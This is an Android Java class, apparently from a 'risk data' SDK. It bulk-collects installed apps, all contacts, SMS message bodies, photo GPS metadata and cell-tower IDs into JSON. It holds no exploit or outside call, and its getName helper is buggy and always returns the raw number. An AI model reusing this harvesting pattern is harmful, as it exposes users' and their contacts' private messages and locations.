package com.newstar.scorpiodata.risk;

import android.Manifest;
import android.app.Activity;
import android.app.usage.StorageStats;
import android.app.usage.StorageStatsManager;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageStats;
import android.content.pm.ResolveInfo;
import android.database.Cursor;
import android.net.Uri;
import android.os.Build;
import android.os.storage.StorageManager;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.telephony.CellIdentityCdma;
import android.telephony.CellIdentityGsm;
import android.telephony.CellIdentityLte;
import android.telephony.CellIdentityWcdma;
import android.telephony.CellInfo;
import android.telephony.CellInfoCdma;
import android.telephony.CellInfoGsm;
import android.telephony.CellInfoLte;
import android.telephony.CellInfoWcdma;
import android.telephony.TelephonyManager;

import androidx.annotation.RequiresApi;

import com.newstar.scorpiodata.utils.ContactHelp;
import com.newstar.scorpiodata.utils.PermissionUtils;
import com.newstar.scorpiodata.utils.PluginInit;
import com.newstar.scorpiodata.utils.SharedHelp;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.util.List;

public class RiskDataUtils {
    @RequiresApi(api = Build.VERSION_CODES.O)
    public static JSONArray getAllAppList(Context context) {
        JSONArray jsonArray = new JSONArray();
        PackageManager packageManager = context.getPackageManager();
        List<PackageInfo> packageInfos = packageManager.getInstalledPackages(0);
        for (int i = 0; i < packageInfos.size(); i++) {
            PackageInfo packageInfo = packageInfos.get(i);
            if (packageInfo != null) {
                try {
                    boolean isSystemApp = (packageInfo.applicationInfo.flags & ApplicationInfo.FLAG_SYSTEM) != 0;
                    JSONObject jsonObject = new JSONObject();
                    jsonObject.put("appName", packageInfo.applicationInfo.loadLabel(packageManager));
                    jsonObject.put("appId", packageInfo.packageName);
                    jsonObject.put("systemApp", isSystemApp);
                    if (!isSystemApp) {
                        jsonObject.put("versionName", packageInfo.versionName);
                        jsonObject.put("versionCode", packageInfo.versionCode);
                        jsonObject.put("firstInstallTime", packageInfo.firstInstallTime);
                        jsonObject.put("lastUpdateTime", packageInfo.lastUpdateTime);
                    }
                    jsonArray.put(jsonObject);
                } catch (Exception ignore) {
                    ignore.printStackTrace();
                }
            }
        }
        return jsonArray;
    }

    public static JSONArray getAllContacts(Context context) {
        JSONArray jsonArray = new JSONArray();
        if (PermissionUtils.checkPermission( Manifest.permission.READ_CONTACTS)) {
            List<ContactHelp> contacts = ContactHelp.getDataList(context.getContentResolver());
            if (contacts != null && contacts.size() > 0) {
                for (ContactHelp contact : contacts) {
                    JSONObject tmpObj = new JSONObject();
                    try {
                        tmpObj.put("contactName", contact.contactName);
                        tmpObj.put("phoneNumber", contact.phoneNumber);
                        tmpObj.put("sendToVoicemail", contact.sendToVoicemail);
                        tmpObj.put("starred", contact.starred);
                        tmpObj.put("pinned", contact.pinned);
                        tmpObj.put("photoFileId", contact.photoFileId);
                        tmpObj.put("inDefaultDirectory", contact.inDefaultDirectory);
                        tmpObj.put("inVisibleGroup", contact.inVisibleGroup);
                        tmpObj.put("isUserProfile", contact.isUserProfile);
                        tmpObj.put("contactLastUpdatedTimestamp", contact.contactLastUpdatedTimestamp);
                        tmpObj.put("groups", contact.groups);
                        tmpObj.put("timesContacted", contact.timesContacted);
                        tmpObj.put("lastTimeContacted", contact.lastTimeContacted);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                    jsonArray.put(tmpObj);
                }
            }
        }else{
            RiskUtils.dispatchErrorEvent("ContactHelp4", "No permission");
        }
        return jsonArray;
    }

    @RequiresApi(api = Build.VERSION_CODES.KITKAT)
    public static JSONArray getSmsList() {
        JSONArray jsonArray = new JSONArray();
        if (PermissionUtils.checkPermission( Manifest.permission.READ_SMS)
                && PermissionUtils.checkPermission( Manifest.permission.READ_CONTACTS)) {
            SharedPreferences sharedPreferences = PluginInit.ACTIVITY.getSharedPreferences("shared_data", Context.MODE_PRIVATE);
            int maxId = sharedPreferences.getInt("MAX_SMS_ID" + SharedHelp.getUid(), 0);
            ContentResolver cr = PluginInit.ACTIVITY.getContentResolver();
            String[] projection = new String[]{
                    BaseColumns._ID,
                    Telephony.Sms.ADDRESS,
                    Telephony.Sms.BODY,
                    Telephony.Sms.TYPE,
                    Telephony.Sms.DATE,
            };
            Cursor cursor = cr.query(Telephony.Sms.CONTENT_URI, projection, BaseColumns._ID + ">?", new String[]{maxId + ""}, BaseColumns._ID + " desc");
            if (cursor == null) {
                return jsonArray;
            }

            boolean firstItem = true;
            while (cursor.moveToNext()) {
                JSONObject tmpObj = new JSONObject();
                int id = cursor.getInt(cursor.getColumnIndex(BaseColumns._ID));
                if (firstItem) {
                    firstItem = false;
                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putInt("MAX_SMS_ID" + SharedHelp.getUid() , id);
                    editor.apply();
                }
                String phone = cursor.getString(cursor.getColumnIndex(Telephony.Sms.ADDRESS));
                String msg = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                int type = cursor.getInt(cursor.getColumnIndex(Telephony.Sms.TYPE));
                long time = cursor.getLong(cursor.getColumnIndex(Telephony.Sms.DATE));

                String name = getName(phone);
                try {
                    tmpObj.put("name", name);
                    tmpObj.put("phone", phone);
                    tmpObj.put("type", type);
                    tmpObj.put("time", time);
                    tmpObj.put("msg", msg);
                    jsonArray.put(tmpObj);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            cursor.close();
        }
        return jsonArray;
    }

    private static String getName(String address) {
        String phone = null;
        if (phone != null && phone.length() >= 10) {
            phone = address.substring(address.length() - 10);
        } else {
            return address;
        }
        String displayName = null;
        Cursor cursor = null;
        try {
            ContentResolver resolver = PluginInit.ACTIVITY.getContentResolver();
            String[] projection = new String[]{ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME};
            cursor = resolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, projection,
                    ContactsContract.CommonDataKinds.Phone.NUMBER + " like ?",
                    new String[]{"%" + phone}, null);

            if (cursor != null && cursor.moveToFirst()) {
                int columnIndexName = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
                displayName = cursor.getString(columnIndexName);
            }
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            if (cursor != null) {
                cursor.close();
            }
        }
        return (displayName == null || displayName.length() == 0) ? address : displayName;
    }

    public static JSONArray getImageList(Context context){
        JSONArray jsonArray = new JSONArray();
        try{
            if (PermissionUtils.checkPermission( Manifest.permission.READ_EXTERNAL_STORAGE)) {
                getImage(MediaStore.Images.Media.INTERNAL_CONTENT_URI, "internal", context, jsonArray);
                getImage(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, "external", context, jsonArray);
            }
        }catch(Exception e){
            e.printStackTrace();
        }
        return jsonArray;
    }

    private static void getImage(Uri uri, String path, Context context, JSONArray jsonArray){
        SharedPreferences sharedPreferences = context.getSharedPreferences("shared_data", Context.MODE_PRIVATE);
        int maxId = sharedPreferences.getInt("MAX_" + path + "_ID" + SharedHelp.getUid(), 0);
        ContentResolver cr = context.getContentResolver();
        String[] projection = new String[]{
                BaseColumns._ID,
                MediaStore.Images.ImageColumns.DISPLAY_NAME,
                MediaStore.Images.ImageColumns.WIDTH,
                MediaStore.Images.ImageColumns.HEIGHT,
                MediaStore.Images.ImageColumns.DATE_ADDED,
                MediaStore.Images.ImageColumns.LONGITUDE,
                MediaStore.Images.ImageColumns.LATITUDE,
                MediaStore.Images.ImageColumns.SIZE,
        };
        Cursor cursor = cr.query(uri, projection, BaseColumns._ID + ">?", new String[]{maxId + ""}, BaseColumns._ID + " desc");
        if (null == cursor) {
            return;
        }
        boolean firstItem = true;
        while (cursor.moveToNext()) {
            JSONObject tmpObj = new JSONObject();
            int id = cursor.getInt(cursor.getColumnIndex(BaseColumns._ID));
            if (firstItem) {
                firstItem = false;
                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putInt("MAX_" + path + "_ID" + SharedHelp.getUid(), id);
                editor.apply();
            }
            String name = cursor.getString(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DISPLAY_NAME));
            int width = cursor.getInt(cursor.getColumnIndex(MediaStore.Images.ImageColumns.WIDTH));
            int height = cursor.getInt(cursor.getColumnIndex(MediaStore.Images.ImageColumns.HEIGHT));
            Long date = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.ImageColumns.DATE_ADDED));
            double latitude = cursor.getDouble(cursor.getColumnIndex(MediaStore.Images.ImageColumns.LATITUDE));
            double longitude = cursor.getDouble(cursor.getColumnIndex(MediaStore.Images.ImageColumns.LONGITUDE));
            long size = cursor.getLong(cursor.getColumnIndex(MediaStore.Images.ImageColumns.SIZE));
            try {
                tmpObj.put("name", name);
                tmpObj.put("width", width);
                tmpObj.put("height", height);
                tmpObj.put("date", date);
                tmpObj.put("latitude", latitude);
                tmpObj.put("longitude", longitude);
                tmpObj.put("size", size);
                jsonArray.put(tmpObj);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        cursor.close();
    }

    @RequiresApi(api = Build.VERSION_CODES.JELLY_BEAN_MR1)
    public static JSONArray getCellinfoList() {
        JSONArray jsonArray = new JSONArray();
        if (PermissionUtils.checkPermission( Manifest.permission.ACCESS_COARSE_LOCATION)
                || PermissionUtils.checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
            TelephonyManager telephonyMgr = (TelephonyManager) PluginInit.ACTIVITY.getSystemService(Context.TELEPHONY_SERVICE);
            List<CellInfo> cellInfos = telephonyMgr.getAllCellInfo();
            //LTE,WCDMA,LTE
            int cid = 0;
            int lac = 0;
            //CDMA
            int sid = 0;
            int nid = 0;
            int bid = 0;
            String type = "";
            for (CellInfo cellInfo : cellInfos) {
                JSONObject tmpObj = new JSONObject();
                cid = 0;
                lac = 0;
                sid = 0;
                nid = 0;
                bid = 0;
                type = "";
                if (cellInfo instanceof CellInfoCdma) {
                    type = "CDMA";
                    CellIdentityCdma cellIdentityCdma = ((CellInfoCdma) cellInfo).getCellIdentity();
                    sid = cellIdentityCdma.getSystemId();
                    nid = cellIdentityCdma.getNetworkId();
                    bid = cellIdentityCdma.getBasestationId();
                } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
                    if (cellInfo instanceof CellInfoWcdma) {
                        type = "WCDMA";
                        CellIdentityWcdma cellIdentityWcdma = ((CellInfoWcdma) cellInfo).getCellIdentity();
                        cid = cellIdentityWcdma.getCid();
                        lac = cellIdentityWcdma.getLac();
                    } else if (cellInfo instanceof CellInfoLte) {
                        type = "LTE";
                        CellIdentityLte cellIdentityLte = ((CellInfoLte) cellInfo).getCellIdentity();
                        cid = cellIdentityLte.getCi();
                        lac = cellIdentityLte.getPci();
                    } else if (cellInfo instanceof CellInfoGsm) {
                        type = "GSM";
                        CellIdentityGsm cellIdentityGsm = ((CellInfoGsm) cellInfo).getCellIdentity();
                        cid = cellIdentityGsm.getCid();
                        lac = cellIdentityGsm.getLac();
                    }
                }
                try {
                    tmpObj.put("cid", cid);
                    tmpObj.put("lac", lac);
                    tmpObj.put("sid", sid);
                    tmpObj.put("nid", nid);
                    tmpObj.put("bid", bid);
                    tmpObj.put("type", type);
                    jsonArray.put(tmpObj);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
        return jsonArray;
    }

    public static JSONArray getAllCameraAppList(Activity activity) {
        JSONArray jsonArray = new JSONArray();
        PackageManager packageManager = activity.getPackageManager();
        Intent intent = new Intent(MediaStore.ACTION_IMAGE_CAPTURE);
        List<ResolveInfo> resolveInfos = packageManager.queryIntentActivities(intent,PackageManager.MATCH_ALL);
        if(resolveInfos!=null && resolveInfos.size()>0){
            for (int i = 0; i < resolveInfos.size(); i++) {
                ResolveInfo resolveInfo = resolveInfos.get(i);
                JSONObject jsonObject = new JSONObject();
                try {
                    jsonObject.put("appId", resolveInfo.activityInfo.packageName);
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                jsonArray.put(jsonObject);
            }
        }
        return jsonArray;
    }
}
